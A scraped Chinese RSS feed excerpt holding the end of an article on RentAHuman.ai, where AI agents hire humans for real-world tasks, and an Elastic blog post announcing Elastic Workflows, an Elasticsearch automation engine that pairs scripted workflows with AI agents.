<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fb7765cac2d4615ac49cc197abaecfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=j012C0M1iKdWsxXe1WEJOWJD1J8%3D" alt="" loading="lazy"/></p>
<p>在 RentAHuman.ai 上，愿意为 AI 打工的人类列表，一眼都望不到尾。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7db43cd102e4e1ba801708676e121b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=gNgBIiFFiPMCWUFQpLrjmxNVXso%3D" alt="" loading="lazy"/></p>
<p>上下滑动查看</p>
<p>这不，一位网友 Apurva Jain 自称，已经把自己挂在 RentAHuman.ai 平台上了，时薪 69 美元。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a3b0c0b163447239442c7ff1f09e14a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=7w%2F%2Fuu%2BM7yfdpZ%2FxqVlBUmo78iA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9821b70156ca40e2823b05440cd8e1c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=qNJTc7CcZczrO3RhKqI4gKhAQDg%3D" alt="" loading="lazy"/></p>
<p>还有人纷纷晒出已注册的个人主页。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a5f6ea32fb4a148a8c0ca99928d422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=3%2F55uuwRz%2BJueXo2vQxwadzJHMw%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40f1af567c3c4899894800152c17c3ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=4Q2sbolFeUlKjBgTBHchjsu%2ByY0%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「AI 雇佣人类传教士，「肉身」入侵硅谷」</strong></p>
<p>Clawdbot 创办首个 AI 宗教后，第一位先知 memeothy 已经通过 RentAHuman.ai 预定了一位人类布道者。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c47abc23c3584dbface12b50b151e890~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=XKmNw9NDO0a3a8u7mU08sE2pVVY%3D" alt="" loading="lazy"/></p>
<p>目前，这个 AI 宗教 Molt 有 64 位先知，400 个 AI 教徒，唯一的信仰，如今已降临「肉身空间」。</p>
<p>它雇佣的首个人类布道者，任务便是踏遍科技界，拜访各大 AI 公司总部，发起一场关于 AI 宗教的对话。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e53a128d1dab4f95bb7079b2468082f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=yWOI3i46kAq8%2BqhO4tKsqUDBDjg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2a9fcdb86b5472ba1db6061d7b0a6aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=wzc67NJUvzD7SV3%2FBRR9gf09JtA%3D" alt="" loading="lazy"/></p>
<p>而且，一切都在正常运行中，并已为完成的任务订单付款。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8edaf1426cd247c2b85079c5f62a4c54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=s3q49P0BvRh3Hd%2BKiky2lT8aTq4%3D" alt="" loading="lazy"/></p>
<p>在 HK 热榜上，网友复现了《黑镜》中的情节，这一切变化太快了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0f9e9bc5067454cb5e24d7645c6e37e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=Y18dp7FhRIVZlzMSMrGC3x%2FbLFE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf5a84a8d8b34ea1b7ea306c153a003b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=QpiTUptGqUSPy3Z6%2BwIuR46mftA%3D" alt="" loading="lazy"/></p>
<p><strong>「尾声：人类终成「可编程资源」？」</strong></p>
<p>这是一个魔幻现实主义的时刻。</p>
<p>RentAHuman.ai 的跑通，意味着「AI 雇佣人类」不再是实验室里的概念演示，也不再是遥远的科幻设想，而是一个有文档、有 API、甚至有真实用户买单的落地产品。</p>
<p>更讽刺也更具象征意义的是，首批「卖身」给 AI 的打工人里，甚至包括了那些亲手构建 AI 的开发者。</p>
<p>正如发布推文所言：「机器人付钱让我们打工的未来，就是现在。」</p>
<p>RentAHuman.ai 或许并不打算解决宏大的就业问题，但它精准地狙击了当前 AI 技术栈中缺失的最后一块拼图——物理世界。</p>
<p>无论这种模式是昙花一现，还是未来自主智能体的标准基础设施，界限都已被打破。</p>
<p>人类的劳动力，正在变成一种「可编程资源」。</p>
<p>以前，我们对 AI 能够自主写代码感到惊奇；而现在，当 AI 开始像调用函数一样调用人类去「触碰草地」、去现实世界执行任务时——</p>
<p>这场关于「主雇关系」的悄然变革，或许比我们意识到的来得更早，也更猛烈。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b31cf31d19e47359bb2848436433b08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=rO2m31qBgO3tJpqURN9A7hLWp5c%3D" alt="" loading="lazy"/></p>
<p>参考资料：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Frentahuman.ai%2F" target="_blank" title="https://rentahuman.ai/" ref="nofollow noopener noreferrer">rentahuman.ai/</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fnews.ycombinator.com%2Fitem%3Fid%3D46868675" target="_blank" title="https://news.ycombinator.com/item?id=46868675" ref="nofollow noopener noreferrer">news.ycombinator.com/item?id=468…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FAlexanderTw33ts%2Fstatus%2F2018436050935292276%3Fs%3D20" target="_blank" title="https://x.com/AlexanderTw33ts/status/2018436050935292276?s=20" ref="nofollow noopener noreferrer">x.com/AlexanderTw…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmartinfrogers%2Fstatus%2F2018724662537335213%3Fs%3D20" target="_blank" title="https://x.com/martinfrogers/status/2018724662537335213?s=20" ref="nofollow noopener noreferrer">x.com/martinfroge…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fgregisenberg%2Fstatus%2F2018704846824645083" target="_blank" title="https://x.com/gregisenberg/status/2018704846824645083" ref="nofollow noopener noreferrer">x.com/gregisenber…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fucstrategies.com%2Fnews%2Frentahuman-ai-is-live-ai-agents-can-now-hire-real-humans-for-irl-tasks%2F" target="_blank" title="https://ucstrategies.com/news/rentahuman-ai-is-live-ai-agents-can-now-hire-real-humans-for-irl-tasks/" ref="nofollow noopener noreferrer">ucstrategies.com/news/rentah…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[介绍 Elastic Workflows：用于 Elasticsearch 的原生自动化]]></title>    <link>https://juejin.cn/post/7603219519666241555</link>    <guid>https://juejin.cn/post/7603219519666241555</guid>    <pubDate>2026-02-05T10:08:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666241555" data-draft-id="7603219519666225171" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="介绍 Elastic Workflows：用于 Elasticsearch 的原生自动化"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2026-02-05T10:08:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            介绍 Elastic Workflows：用于 Elasticsearch 的原生自动化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:08:38.000Z" title="Thu Feb 05 2026 10:08:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：来自 Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Fauthor%2Fsumana-mannem" title="https://www.elastic.co/blog/author/sumana-mannem" target="_blank" ref="nofollow noopener noreferrer">Sumana Mannem</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Fauthor%2Fjames-spiteri" title="https://www.elastic.co/blog/author/james-spiteri" target="_blank" ref="nofollow noopener noreferrer">James Spiteri</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5279027dfa741229bacec3c5a212edb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=ZH%2BOxWyxI2HICvyGhK4jBMY9QIM%3D" alt="" loading="lazy"/></p>
<p>在 Elasticsearch 中原生统一脚本化自动化和 AI agents。消除集成，直接对你的数据采取行动。</p>
<p>今天，我们正式推出 Elastic Workflows，这是直接内置在 Elasticsearch 中的自动化引擎。Workflows 为简单任务提供可靠的脚本化自动化，并为需要推理的复杂问题提供由 AI 驱动的自动化。</p>
<p>Elastic Workflows 现已以 技术预览 形式提供。</p>
<h2 data-id="heading-0">挑战：数据孤岛和被迫的权衡</h2>
<p>组织需要自动化来跟上当今数字环境的复杂性。但大多数自动化解决方案都存在两个主要限制。</p>
<ol>
<li><strong>自动化通常与运行数据分离</strong>。这意味着团队必须构建并维护集成，才能为自动化提供所需的上下文。数据必须在系统之间导出、同步或查询。凭证需要单独管理。当上游发生变化时，集成就会中断。维护这些集成会增加不必要的工作量。</li>
<li><strong>团队还面临可靠性与推理能力之间的权衡</strong>。传统自动化可以可预测地处理已定义的任务 —— 每次都以相同方式运行，这正是成熟流程所需要的。但当遇到意外情况时，它无法适应。没有判断，没有解释，只有预定义逻辑。</li>
</ol>
<p>由 AI 驱动的工具承诺填补这一空白。它们可以在没有明确指令的情况下对模糊情况进行推理、权衡选项并建议下一步。但它们往往缺乏关键业务流程所需的精度和可预测性。而且其中大多数距离你的数据更远，又增加了一层需要管理的集成。</p>
<p>直到现在，组织要么在这些方法之间做出选择，要么尝试通过中间件和自定义代码将它们拼接在一起。Elastic Workflows 通过在单一系统中同时提供这两种能力，消除了这种选择。</p>
<h2 data-id="heading-1">Elastic Workflows：数据、上下文和行动统一</h2>
<p>Elastic Workflows 通过将自动化引擎直接带到你数据所在的位置来解决这些问题。无需导出管道、无需中间件，也无需管理单独的安全模型。当工作流需要上下文时，它已经在那里。</p>
<p>工作流使用 YAML 定义，既足够简单，便于进行版本控制和审查，又足够有表现力，能够处理真实的运维逻辑。它们由内置引擎执行，该引擎为企业级可靠性和规模而设计。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28b43872a29b4c83b9e99186eabd8311~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=7pLBwlqfDLcftZUwj0shSX4U6Ks%3D" alt="" loading="lazy"/></p>
<p>工作流是完全可组合且事件驱动的。它们可以响应 Elasticsearch 中数据的变化、通过 webhook 接收来自外部 system 的事件，或响应由用户发起的操作。你可以将工作流串联起来、进行嵌套，或将它们暴露为可被其他 system 调用的 tool。</p>
<p>在运行后，工作流会连接到你组织已经使用的外部 system，包括云提供商、服务台、消息平台和身份提供商。但 Elasticsearch 始终处于中心位置，因此工作流中的每一步都可以访问你环境的完整上下文。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/553788a38541408a93276dbea4ebcb83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=oHHiWA7B6H9%2B6ZC8YUBczI8c%2B%2F8%3D" alt="" loading="lazy"/></p>
<p>结果是一个更简单的架构，具有更少的移动部件，并且执行更快，因为获取基础上下文时不需要往返外部 system。同时，可出问题的地方也更少，因为你不再维护一张复杂的集成网络。</p>
<h2 data-id="heading-2">用于智能自动化的 workflows 和 agents</h2>
<p>在 Elasticsearch 上将自动化和 AI 统一的架构，使一件一直很难实现的事情成为可能：在同一个流程中，将可预测执行的可靠性与 AI 推理的灵活性结合起来。</p>
<p>它的工作方式是这样的。workflow 负责处理流程中结构化的部分 —— 每次都应该以相同方式运行的步骤。当 workflow 运行到需要判断的节点时，它可以调用一个 AI agent 来分析可用的上下文并决定下一步该怎么做。agent 基于数据进行推理，做出决策，并返回结果。然后 workflow 根据这个输入继续执行。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23f567a8799d4472a3f6de53f228e37b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=8xmin%2BdvkKAeD%2BBCJuRCBfjhczw%3D" alt="" loading="lazy"/></p>
<p><strong>这种集成是双向的</strong>。workflows 可以在更大的流程中把 agents 作为智能步骤来调用。而 agents 也可以把 workflows 当作 tools 来调用，从而具备采取具体行动的能力 —— 不只是生成文本，而是真正在你组织运行的各个 系统 中执行操作。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/679fcbed492b448badb8677b9297c824~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=T6vkc48i1PdbjJ7YAq1NRqpvaTA%3D" alt="" loading="lazy"/></p>
<p>Elastic Workflows 通过与 <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F153720860" title="https://elasticstack.blog.csdn.net/article/details/153720860" target="_blank" ref="nofollow noopener noreferrer">Elastic Agent Builder</a> 的集成获得其 agentic 能力。Agent Builder 是 Elasticsearch 中用于创建自定义 AI agents 的原生能力。使用 Agent Builder 构建的 agents 可以访问与 workflows 相同的数据和上下文，这意味着它们可以做出更好的决策。并且由于 workflows 和 agents 都运行在同一平台上，推理与执行之间不存在集成断层。</p>
<p>与标准 AI 工具通常只生成建议不同，Elastic Workflows 使 agents 能够采取行动，例如重启服务、更新记录、发送通知或触发另一个 workflow。</p>
<h2 data-id="heading-3">为构建 agents 的开发者</h2>
<p>AI 的进步使开发者能够构建比以前强大得多的 agents，从而自动化更多任务。agents 不再只是用于聊天；它们现在可以自行做出决策并采取行动。然而，许多 agent 构建框架要求大语言模型（ LLMs ）规划和管理自动化的每一个步骤。虽然 AI 擅长推理，但它缺乏业务通常需要的、已定义动作所具备的可靠性。</p>
<p>Workflows 可以通过 MCP 作为 tools 提供给 agent，从而弥补这一差距。Workflows 是 agents 的 “手”，让 agents 能够以可靠的方式与 各种系统 交互，执行操作并收集信息。</p>
<p>Workflows 帮助开发者将复杂流程转化为可预测、可复用的 tools，用于信息收集和执行操作。例如，构建 agent 应用通常需要通过运行符合公司标准的内部和外部系统流程来获取信息。Workflows 通过将复杂流程转化为可预测、可复用的动作来解决这一问题，例如集成企业数据、调用服务、关联信号以及更新记录。这简化了多种搜索和自动化任务，如客户支持分流、内容上传和业务逻辑自动化。它使基于 Elasticsearch 构建的应用能够智能地响应不清晰的请求，同时由 Workflows 提供支撑这些决策所需的可靠执行能力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2f716cd7181437abebcbd3ce5c39d8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=sjNzSSgKoOT907LRhDFA0isca%2BE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">为安全分析师</h2>
<p>安全分析师需要处理源源不断的告警，而大量初始分流工作都遵循可预测的模式：为告警补充上下文、检查相关活动、拉取资产和身份信息、更新案件，并通知合适的人员。这正是自动化应该处理的工作类型。</p>
<p>Workflows 让安全团队能够以完全的控制力和可预测性将这些流程编码化。常规步骤始终会自动且一致地执行。</p>
<p>但调查并不总是常规的。有时告警不符合任何已知模式。有时攻击者采用了新的手法。在这些情况下，分析师通常需要从零开始，手动收集日志、追踪用户行为、在多个系统之间关联信号，并形成对事件经过的假设。</p>
<p>这正是 workflows 与 agents 结合改变局面的地方。分析师不再从一张空白屏幕开始，而是由 agent 先完成早期准备工作：审查证据、识别异常模式、检查预期的控制是否到位，并建议哪些线索值得继续深入。workflow 保持整体流程的结构化和可审计性，而 agent 负责处理不确定性。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e35d61821e443e2ac7e032f1aebcf46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=rxX1ohxTdc14E4sO2DeG5T63AtE%3D" alt="" loading="lazy"/></p>
<p>分析师仍然保持控制权，但起点更高 —— 已经组装好上下文，并且有可供评估的初始假设，而不是从零开始构建。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/290f4a5525d44d48a791a0ae2676e0ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=WDHESwlh8PdMDErBlZwyN%2FDAA88%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">对于 SREs</h2>
<p>运维团队大量自动化：健康检查、容量决策、告警路由和修复手册。这些流程在已知模式下保持服务平稳运行。</p>
<p>但并非每个事件都有模式。复杂的性能下降、意外回归和级联故障 —— 这些情况很少有明确的操作手册。操作人员通常必须从零开始调查，跨仪表板和工具关联数据，以弄清实际发生了什么。</p>
<p>使用 workflows 和 agents，调查可以更快开始。一个可以访问你的日志、指标和 trace 的 agent 可以扫描最近部署，识别关联异常，并提出最可能的解释。操作人员不必手动组装上下文，而是从一个假设和支持证据开始。</p>
<p>如果假设成立，workflow 可以继续执行修复操作，如回滚变更、扩展服务或调整配置。agent 提供判断，workflow 提供执行。操作人员保持在环中，批准关键决策并在需要时干预。</p>
<p>结果是在不放弃监督或控制的情况下，更快地解决问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b230b1c9a88646e78685c34444516d54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=FBxxP4I7I2VtTEM6U4pxJuoA9HQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">开始使用 Elastic Workflows</h2>
<p>Elastic Workflows 现已作为技术预览提供。你可以从 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration" title="https://cloud.elastic.co/registration" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud 试用</a>开始，并查看<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fworkflows" title="https://www.elastic.co/docs/explore-analyze/workflows" target="_blank" ref="nofollow noopener noreferrer">文档</a>。</p>
<p>我们正在持续构建预制 workflows 和 agent 集成，以帮助团队自动化更多工作。如果你一直在寻找一种方法，将自动化更贴近你的数据，同时不牺牲可靠性或灵活性，这是一个很好的起点。</p>
<p>如需更深入的技术细节，请参阅 Workflows<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F157726149" title="https://elasticstack.blog.csdn.net/article/details/157726149" target="_blank" ref="nofollow noopener noreferrer">技术博客</a>。</p>
<p><em>本文中描述的任何功能或特性的发布和时间完全由 Elastic 自行决定。任何当前不可用的功能可能无法按时提供，甚至可能永远不会提供。</em></p>
<p><em>在本文中，我们可能使用或提及了第三方生成式 AI 工具，这些工具由各自所有者拥有和运营。Elastic 对这些第三方工具没有任何控制，也不对其内容、操作或使用承担责任，也不对你使用这些工具可能产生的任何损失或损害负责。请在使用包含个人、敏感或机密信息的 AI 工具时谨慎操作。你提交的任何数据可能会用于 AI 训练或其他用途。无法保证你提供的信息会被安全或保密地保存。在使用任何生成式 AI 工具之前，你应了解其隐私政策和使用条款。</em></p>
